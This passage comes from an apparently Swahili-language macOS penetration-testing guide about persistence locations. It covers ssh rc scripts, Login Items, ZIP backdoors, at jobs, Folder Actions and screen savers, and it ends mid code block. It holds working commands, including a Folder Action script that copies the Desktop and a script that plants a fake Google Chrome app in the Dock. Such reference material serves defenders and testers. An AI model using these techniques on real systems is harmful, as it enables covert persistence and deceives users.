Maelezo: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Inafaa kwa kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini ssh inahitaji kuwashwa na kutumiwa
- Kukwepa TCC: [✅](https://emojipedia.org/check-mark-button)
  - Matumizi ya SSH ili kupata ufikiaji wa FDA

#### Mahali

- **`~/.ssh/rc`**
  - **Kichochezi**: Kuingia kupitia ssh
- **`/etc/ssh/sshrc`**
  - Huhitaji root
  - **Kichochezi**: Kuingia kupitia ssh

> [!CAUTION]
> Kuwasha ssh kunahitaji Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Maelezo na Utekelezaji

Kwa chaguomsingi, isipokuwa `PermitUserRC no` iwekwe katika `/etc/ssh/sshd_config`, mtumiaji **anapoingia kupitia SSH**, hati **`/etc/ssh/sshrc`** na **`~/.ssh/rc`** zitatekelezwa.<sup>[[14]](#references)</sup>

### **Login Items**

Maelezo: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Hufaa kwa kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini unahitaji kutekeleza `osascript` pamoja na args
- Kukwepa TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **Programu saidizi ya login-item iliyosajiliwa:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (mahali pa kawaida pa programu zilizounganishwa).
  - **Kichochezi:** Usajili unaweza kuanzisha programu saidizi mara moja; kisha itaanza wakati wa login za baadaye za mtumiaji, kulingana na idhini.
- **Agent/daemon iliyounganishwa na kusajiliwa:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` au `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Kichochezi:** Agent iliyoidhinishwa inaweza kuanza wakati wa usajili na katika login za baadaye; daemon iliyoidhinishwa huanza wakati wa kuwasha mfumo. Daemon inahitaji idhini ya admin.

#### Maelezo

Katika **System Settings → General → Login Items & Extensions**, watumiaji wanaweza kukagua vipengee vya login na vya usuli. macOS 13 na matoleo ya baadaye hutoa [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) kwa ajili ya kusajili login items, launch agents na launch daemons zilizounganishwa. [`Tabia ya register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) hutofautiana kulingana na aina na hali ya idhini. **Kuandika programu saidizi ndani ya app bundle hakutoshi kusajili login item mpya.** Kinyume chake, ikiwa executable ya programu saidizi iliyosajiliwa tayari inaweza kuandikwa, kuibadilisha kunaweza kuathiri uzinduzi wake unaofuata bila usajili mpya; thibitisha kwanza njia halisi na ukaguzi wa code-signing.

Ifuatayo ni njia ya kusoma tu ya kutafuta programu saidizi zilizounganishwa kwenye Mac; haisajili wala kuzindua yoyote kati yazo:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Kwa plist ya launch iliyojumuishwa, tafuta `BundleProgram` **ikilinganishwa na mzizi wa app bundle** (kwa mfano `Contents/MacOS/Helper`), kama inavyoeleza [mwongozo wa Apple wa uhamishaji wa Service Management](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos). Orodha ya ` /Applications` iliyokusanywa kwa kusoma tu kwenye Mac ya utafiti ilipata maingizo 14 ya helper zilizojumuishwa na matamko matano ya `BundleProgram`; malengo yote matano yalipatikana, na mawili yalifaulu ukaguzi wa uwezekano wa kuandikiwa na mtumiaji. Ukaguzi huo **hauthibitishi** kwamba helper yoyote kati ya hizo imesajiliwa, imewezeshwa, inaweza kutekelezwa baada ya uthibitishaji wa signature, au inaweza kufikiwa na sandbox. `sfltool dumpbtm` iliorodhesha rekodi 150 zenye majina kwenye Mac hii; ni kifaa cha ukaguzi, si jaribio linalothibitisha kwamba kila rekodi inafanya kazi.

Vipengee vya zamani vya login pia vinaweza kudhibitiwa kupitia Apple events. Inawezekana kuviorodhesha, kuviongeza na kuviondoa kutoka kwenye command line, ingawa kuviongeza hubadilisha usanidi endelevu wa login wa mtumiaji na kunaweza kuhitaji idhini ya Automation:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` ni maelezo ya utekelezaji, si mahali panapoungwa mkono pa kusakinisha payload kwa kuandika faili tu. API ya zamani ya `SMLoginItemSetEnabled` imebadilishwa na `SMAppService` kwa helpers mpya; njia ya awali ya ukurasa `/var/db/com.apple.xpc.launchd/loginitems.501.plist` haikuwepo kwenye mashine ya majaribio ya macOS 26.5.2. Tumia API ya usajili na hali ya UI ya mfumo unapokagua login items za kisasa, badala ya kudhani kuwa njia fulani ya hifadhidata ipo.

### ZIP kama Login Item

(Angalia sehemu iliyotangulia kuhusu Login Items; huu ni upanuzi)

Ukihifadhi faili ya **ZIP** kama **Login Item**, **`Archive Utility`** itaifungua. Ikiwa, kwa mfano, ZIP hiyo imehifadhiwa ndani ya **`~/Library`** na ina folda **`LaunchAgents/file.plist`** yenye backdoor, folda hiyo itaundwa (haipo kwa chaguo-msingi) na plist itaongezwa. Kwa hiyo, mtumiaji atakapoingia tena wakati ujao, **backdoor iliyoonyeshwa kwenye plist itatekelezwa**.

Chaguo jingine ni kuunda faili **`.bash_profile`** na **`.zshenv`** ndani ya HOME ya mtumiaji, ili mbinu hii ifanye kazi hata kama folda ya LaunchAgents tayari ipo.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Inafaa kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini unahitaji **kutekeleza** **`at`**, na lazima iwe **imewashwa**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- Unahitaji **kutekeleza** **`at`**, na lazima iwe **imewashwa**

#### **Maelezo**

Kazi za `at` zimeundwa kwa **kupanga kazi za mara moja** zitekelezwe nyakati fulani. Tofauti na kazi za cron, kazi za `at` huondolewa kiotomatiki baada ya kutekelezwa. Ni muhimu kutambua kwamba kazi hizi huendelea kuwepo baada ya mfumo kuwashwa upya, jambo linalozifanya kuwa hatari za kiusalama zinazoweza kutokea katika hali fulani.<sup>[[16]](#references)</sup>

`com.apple.atrun.plist` iliyojumuishwa ina `Disabled = true`, lakini launchd huhifadhi kando overrides zinazotumika za kuwasha/kuzima. Kwenye mashine ya majaribio ya macOS 26.5.2, `launchctl print-disabled system` iliripoti kuwa `com.apple.atrun` **imewashwa**, licha ya ufunguo huo uliowekwa kwenye plist iliyojumuishwa. Kagua hali inayotumika kabla ya kudai kuwa kazi za `at` zitatekelezwa:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Msimamizi anaweza kuwezesha huduma ya `atrun` iliyozimwa kwa kutumia `launchctl`; mfano ufuatao wa kihistoria hubadilisha hali ya huduma ya mfumo na **haukuendeshwa kwenye Mac ya utafiti**:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Hii itaunda faili baada ya saa 1:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Angalia foleni ya kazi kwa kutumia `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Hapo juu tunaweza kuona kazi mbili zilizopangwa. Tunaweza kuchapisha maelezo ya kazi kwa kutumia `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Ikiwa kazi za AT hazijawezeshwa, kazi zilizoundwa hazitatekelezwa.

**Faili za job** zinapatikana kwenye `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Jina la faili lina foleni, nambari ya kazi na muda uliopangwa wa kuendeshwa. Kwa mfano, tuangalie `a0001a019bdcd2`.

- `a` - hii ndiyo foleni
- `0001a` - nambari ya kazi katika hex, `0x1a = 26`
- `019bdcd2` - muda katika hex. Unawakilisha dakika zilizopita tangu epoch. `0x019bdcd2` ni `26991826` katika desimali. Tukizidisha kwa 60 tunapata `1619509560`, ambayo ni `GMT: 2021. April 27., Tuesday 7:46:00`.

Tukichapisha faili ya kazi, tunapata kwamba ina taarifa zilezile tulizopata kwa kutumia `at -c`.

### Arifa za Calendar za kufungua faili

- **Lengo la kuandikia:** App bundle inayoweza kutekelezwa au faili nyingine **ambayo tayari imechaguliwa** na arifa maalum ya Calendar ya **Open file** ya tukio. Kuunda au kuhariri arifa yenyewe kunahitaji ufikiaji wa tukio hilo la kalenda kupitia Calendar au chanzo cha data ya kalenda kilichoidhinishwa; kuandika faili isiyohusiana hakuundi arifa.
- **Kichochezi:** Muda uliopangwa wa arifa kwenye Mac ambako Calendar huchakata tukio hilo. Tukio linalojirudia linaweza kurudia kitendo hicho. [Mwongozo wa sasa wa Calendar wa Apple](https://support.apple.com/guide/calendar/icl1012/mac) unathibitisha chaguo la arifa la **Custom → Open file** kwenye macOS 26.
- **Utambulisho wa utekelezaji na masharti:** Calendar hufungua faili iliyochaguliwa kwa mtumiaji aliyeingia kupitia programu inayohusishwa nayo. Kufungua app bundle kunaweza kutekeleza msimbo wake kama mtumiaji huyo, kutegemea Gatekeeper, quarantine na ukaguzi mwingine wa macOS. Faili ya kawaida ya script inaweza kufunguliwa tu kwenye kihariri; kiendelezi chake pekee hakithibitishi utekelezaji wa msimbo.

Ili kutathmini faili inayoweza kutumika, kagua arifa ya tukio hilo katika Calendar na ruhusa za faili iliyochaguliwa. Njia hii iliandikwa kwa kutumia mwongozo wa Apple na **haikujaribiwa** kwenye Mac ya utafiti kwa sababu kuijaribu kungebadilisha kalenda inayotumika na kusubiri tukio la eneo-kazi. Jaribio kwenye akaunti ya muda linaweza kuchagua app bundle yenye alama pekee, kuweka arifa ya Open file ya muda wa karibu, kuthibitisha kufunguka kwake, kisha kufuta tukio na app.

### Automations za Shortcuts kwenye macOS

- **Lengo la kuandikia:** Faili inayoweza kutekelezwa **ambayo tayari imerejelewa** na kitendo cha shortcut, au shortcut iliyopo ambayo mtumiaji aliyeidhinishwa anaweza kuhariri. Faili ya `.shortcut` isiyohusiana au kuandika kwenye hifadhidata ya Shortcuts ambayo haijaandikwa kwenye nyaraka si njia inayoungwa mkono ya kusajili automation.
- **Kichochezi na utambulisho:** Tukio la automation lililosanidiwa na kuwezeshwa awali, kama vile muda wa siku au tukio la app, huendesha shortcut kwa mtumiaji aliyeingia. [Mwongozo wa sasa wa Apple wa automation kwenye Mac](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) unaorodhesha matukio yanayoungwa mkono, unaeleza wakati automation inaweza kuendeshwa bila kuuliza, na unaeleza jinsi ya kuondoa kichochezi. [Mwongozo wa faragha wa Shortcuts wa Apple](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) unahitaji **Allow Running Scripts** kwa vitendo vya script, na vitendo mahususi bado vinaweza kuomba ruhusa.

Hii ni njia ya masharti ya kuandika-kisha-utekelezaji **tu wakati kitendo kilichopo kinapakia lengo linaloweza kuandikiwa**. Kuunda automation mpya kupitia UI hubadilisha mipangilio inayotumika na hakukujaribiwa kwenye Mac ya utafiti. Kwenye akaunti ya muda, mmiliki anaweza kusanidi shortcut ya muda wa siku ambayo script yake inagusa `/tmp/ht-shortcuts-marker`, kuwezesha ruhusa zinazohitajika, kuthibitisha alama baada ya tukio, kisha kufuta automation, shortcut na alama.

### Vitendo vya Automator na Quick Actions

- **Malengo ya kuandikia:** `~/Library/Automator/*.action` (mtumiaji) na `/Library/Automator/*.action` (msimamizi) kwa action bundles. Workflow ya Quick Action iliyohifadhiwa kwa kawaida huwekwa katika `~/Library/Services/*.workflow`; kagua njia halisi ya workflow iliyochaguliwa na mtumiaji. [Rejeleo la framework ya Automator la Apple](https://developer.apple.com/documentation/automator) linaorodhesha saraka za kutafutia vitendo.
- **Kichochezi:** Automator hupakia action bundles zinazopatikana inapoendeshwa, lakini kazi ya kitendo huendeshwa workflow inayokitumia inapotekelezwa. Quick Action huendeshwa mtumiaji anapoichagua kutoka Finder, Services au menyu nyingine inayoonyeshwa. Workflow ya Folder Action huendeshwa vitu vinapoongezwa kwenye folda yake **ambayo tayari imeunganishwa**, na workflow ya Calendar Alarm huendeshwa wakati wa tukio lake. [Aina za workflow za Apple](https://support.apple.com/guide/automator/aut7cac58839/mac) zinatofautisha matukio haya. Kuandika tu kitendo au workflow hakuunganishi folda wala kupanga tukio la kalenda.
- **Utambulisho wa utekelezaji na masharti:** Akaunti inayoendesha workflow; Automator au app inayoiita lazima ipakie kitendo, na ukaguzi wowote wa sasa wa kusaini msimbo au faragha lazima uruhusu. Action bundle inayoweza kuandikiwa na ambayo tayari imerejelewa na workflow inayotumika ni hali tofauti na kusakinisha kitendo kipya na kusubiri kichaguliwe.

Saraka za mtumiaji `Automator` na `Services` zilikuwepo kwenye Mac ya majaribio ya macOS 26.5.2; `/Library/Automator` haikuwepo. Hakuna workflow inayotumika iliyoundwa, kuunganishwa au kutekelezwa. Tumia akaunti ya muda na action/workflow yenye alama pekee ili kuthibitisha njia fulani ya kupakia. Sehemu tofauti ya [Folder Actions](#folder-actions) inaeleza kwa undani zaidi chanzo hicho cha tukio.

### Folder Actions

Maelezo: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Maelezo: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Hufaa kwa kukwepa sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini unahitaji kuweza kuita `osascript` kwa hoja za kuwasiliana na **`System Events`** ili uweze kusanidi Folder Actions
- Ukwepaji wa TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Ina ruhusa za msingi za TCC kama Desktop, Documents na Downloads

#### Mahali

- **`/Library/Scripts/Folder Action Scripts`**
  - Inahitaji root
  - **Kichochezi**: Ufikiaji wa folda iliyobainishwa
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Kichochezi**: Ufikiaji wa folda iliyobainishwa

#### Maelezo na Unyonyaji

Folder Actions ni scripts zinazoendeshwa kiotomatiki kutokana na mabadiliko katika folda, kama vile kuongeza au kuondoa vitu, au vitendo vingine kama kufungua au kubadilisha ukubwa wa dirisha la folda. Vitendo hivi vinaweza kutumika kwa kazi mbalimbali, na vinaweza kuchochewa kwa njia tofauti, kama kutumia UI ya Finder au amri za terminal.<sup>[[17]](#references)[[18]](#references)</sup>

Ili kusanidi Folder Actions, unaweza kuchagua mojawapo ya njia hizi:

1. Kuunda workflow ya Folder Action kwa [Automator](https://support.apple.com/guide/automator/welcome/mac) na kuisakinisha kama service.
2. Kuambatisha script mwenyewe kupitia Folder Actions Setup iliyo kwenye menyu ya muktadha ya folda.
3. Kutumia OSAScript kutuma ujumbe wa Apple Event kwa `System Events.app` ili kusanidi Folder Action kwa njia ya programu.
   - Njia hii ni muhimu hasa kwa kupachika kitendo kwenye mfumo, na hivyo kutoa kiwango fulani cha persistence.

Script ifuatayo ni mfano wa kinachoweza kutekelezwa na Folder Action:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Ili kufanya script iliyo hapo juu iweze kutumiwa na Folder Actions, i-compile kwa kutumia:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Baada ya script kukompilishwa, sanidi Folder Actions kwa kutekeleza script iliyo hapa chini. Script hii itawezesha Folder Actions kwa ujumla na kuambatisha script iliyokompilishwa awali kwenye folda ya Desktop.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Endesha hati ya usanidi kwa kutumia:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Hivi ndivyo unavyotekeleza persistence hii kupitia GUI:

Hii ndiyo script itakayoendeshwa:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Ikompili kwa kutumia: `osacompile -l JavaScript -o folder.scpt source.js`

Ihamishe hadi:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Kisha, fungua app ya `Folder Actions Setup`, chagua **folder unayotaka kufuatilia** na uchague **`folder.scpt`** katika hali yako (katika hali yangu niliipa jina output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Sasa, ukifungua folder hiyo kwa **Finder**, script yako itatekelezwa.

Mipangilio hii ilihifadhiwa katika **plist** iliyoko **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** katika muundo wa base64.

Sasa, tujaribu kuandaa persistence hii bila ufikiaji wa GUI:

1. **Nakili `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** hadi `/tmp` ili kuihifadhi kama nakala rudufu:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Ondoa** Folder Actions ulizoweka hivi punde:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Sasa kwa kuwa tuna mazingira tupu

3. Nakili faili la nakala rudufu: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Fungua Folder Actions Setup.app ili itumie usanidi huu: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Hili halikufanya kazi kwangu, lakini haya ndiyo maelekezo kutoka kwenye writeup:(

### Njia za mkato za Dock

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Inafaa kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Lakini lazima uwe umesakinisha application hasidi ndani ya mfumo
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `~/Library/Preferences/com.apple.dock.plist`
  - **Kichochezi**: Mtumiaji anapobofya app iliyo ndani ya dock

#### Maelezo na Exploitation

Applications zote zinazoonekana kwenye Dock zimeainishwa ndani ya plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Inawezekana **kuongeza application** kwa kutumia tu:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Kwa kutumia **social engineering**, unaweza **kuiga, kwa mfano, Google Chrome** ndani ya dock na kutekeleza script yako mwenyewe:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Mbinu za Kuingiza

- **Lengo la kuandika:** Bundle ya programu ya mbinu ya kuingiza yenye msimbo, iliyosakinishwa katika `~/Library/Input Methods/` (mtumiaji) au `/Library/Input Methods/` (msimamizi). Hii ni tofauti na faili za Apple za ramani za kibodi za maandishi ya kawaida za `.inputplugin`, ambazo zenyewe si payload ya msimbo wowote.
- **Kichochezi:** Mtumiaji huongeza/kuwezesha chanzo cha ingizo katika **Mipangilio ya Mfumo → Kibodi → Uingizaji wa Maandishi**, kisha hukichagua au kukitumia. Bundle kunakiliwa tu kwenye saraka hiyo si uthibitisho kwamba macOS itakizindua. [Mwongozo wa sasa wa Apple kuhusu Vyanzo vya Ingizo](https://support.apple.com/guide/mac-help/mchl84525d76/mac) unaeleza jinsi ya kuwezesha na kubadilisha vyanzo; [hati za Apple za InputMethodKit](https://developer.apple.com/documentation/inputmethodkit) zinahusu mbinu za kuingiza zenye msimbo.
- **Utambulisho wa utekelezaji na vizuizi:** Mbinu huendeshwa kwa mtumiaji aliyeingia, kulingana na usajili wa mbinu ya kuingiza, kusainiwa kwa msimbo, na ukaguzi wa sasa wa usalama wa macOS. Mbinu zilizopo na kuwezeshwa zenye faili tekelezi inayoweza kuandikwa zinahitaji ukaguzi tofauti wa njia na sahihi.

Tayari dokezo la zamani la Apple kuhusu mbinu za kuingiza za wahusika wengine [lilionya](https://developer.apple.com/library/archive/qa/qa1810/_index.html) kwamba kunakili baadhi ya mbinu za palette kwenye saraka hizi hakuzifanyi hata zionekane katika Vyanzo vya Ingizo. Kwenye Mac ya utafiti yenye macOS 26.5.2, saraka ya mtumiaji ipo, lakini hakuna bundle iliyosakinishwa au kuamilishwa; kwa hiyo hii ni njia yenye masharti iliyoandikwa, si matokeo ya ndani ya wakati wa utekelezaji.

### Vichagua Rangi

Maelezo: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Inafaa kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Hatua mahususi sana inahitaji kufanyika
  - Utaishia kwenye sandbox nyingine
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `/Library/ColorPickers`
  - Root inahitajika
  - Kichochezi: Tumia kichagua rangi
- `~/Library/ColorPickers`
  - Kichochezi: Tumia kichagua rangi

#### Maelezo na Exploit

**Compile bundle ya kichagua rangi** yenye msimbo wako (unaweza kutumia [**hii kwa mfano**](https://github.com/viktorstrate/color-picker-plus)) na uongeze constructor (kama ilivyo katika [sehemu ya Screen Saver](macos-auto-start-locations.md#screen-saver)), kisha unakili bundle hiyo kwenye `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Kisha, kichagua rangi kinapowashwa, bundle yako inapaswa pia kutekelezwa.

Hii inategemea programu inayooana kufungua paneli ya rangi ya mfumo na kuchagua kichagua rangi kilichosakinishwa. [Mwongozo wa Apple kuhusu paneli ya rangi](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) unaeleza mahali pa zamani pa bundle. Ukaguzi wa njia ya ndani ulipata huduma ya zamani ya XPC ya kichagua rangi, lakini hakuna kichagua rangi kilichosakinishwa au kupakiwa kwenye Mac ya utafiti; usihitimishe kuwa kuna TCC bypass kwa kutegemea njia hiyo pekee.

Kumbuka kwamba binary inayopakia library yako ina **sandbox yenye vizuizi vikali sana**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Maelezo**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Maelezo**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Yanafaa kwa bypass ya sandbox: **Hapana, kwa sababu unahitaji kuendesha app yako mwenyewe**
- TCC bypass: Inategemea sandbox na ruhusa za extension iliyowezeshwa; hakuna bypass ya jumla iliyothibitishwa.

#### Mahali

- App mahususi

#### Maelezo na Exploit

Mfano wa application yenye Finder Sync Extension [**unaweza kupatikana hapa**](https://github.com/D00MFist/InSync).

Applications zinaweza kuwa na `Finder Sync Extensions`. Extension hii huwekwa ndani ya application itakayoendeshwa. Zaidi ya hayo, ili extension iweze kutekeleza code yake, **lazima isainiwe** kwa kutumia cheti halali cha Apple developer, lazima iwe **sandboxed** (ingawa kunaweza kuongezwa vighairi vilivyolegezwa) na lazima isajiliwe kwa kitu kama hiki:<sup>[[21]](#references)[[22]](#references)</sup>

Extension iliyosakinishwa pia inahitaji **kuwezeshwa** na kuitwa kwa eneo au kipengee husika cha Finder; kuandika bundle ya `.appex` kiholela hakutoshi. [Finder Sync API ya Apple](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) inaonyesha hali ya kuwezeshwa. Amri za `pluginkit` zilizo hapa chini zinaonyesha usajili na uwezeshaji wa wazi, si auto-start inayotegemea faili pekee. Njia hii ilikaguliwa kwa kurejelea nyaraka, bila kusakinisha au kuwezesha extension mpya kwenye Mac ya utafiti.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Kihifadhi Skrini

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Inasaidia kukwepa sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Lakini utaishia kwenye sandbox ya kawaida ya programu
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `/System/Library/Screen Savers`
  - Ruhusa za root zinahitajika
  - **Kichocheo**: Chagua kihifadhi skrini
- `/Library/Screen Savers`
  - Ruhusa za root zinahitajika
  - **Kichocheo**: Chagua kihifadhi skrini
- `~/Library/Screen Savers`
  - **Kichocheo**: Chagua kihifadhi skrini

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Maelezo na Exploit

Unda project mpya katika Xcode na uchague template ya kutengeneza **Screen Saver** mpya. Kisha, ongeza code yako, kwa mfano code ifuatayo ya kutengeneza logs.<sup>[[23]](#references)[[24]](#references)</sup>

**Build** na unakili bundle ya `.saver` kwenye **`~/Library/Screen Savers`**. Kisha, fungua GUI ya Screen Saver na ukiibofya tu, inapaswa kutengeneza logs nyingi:

```bash
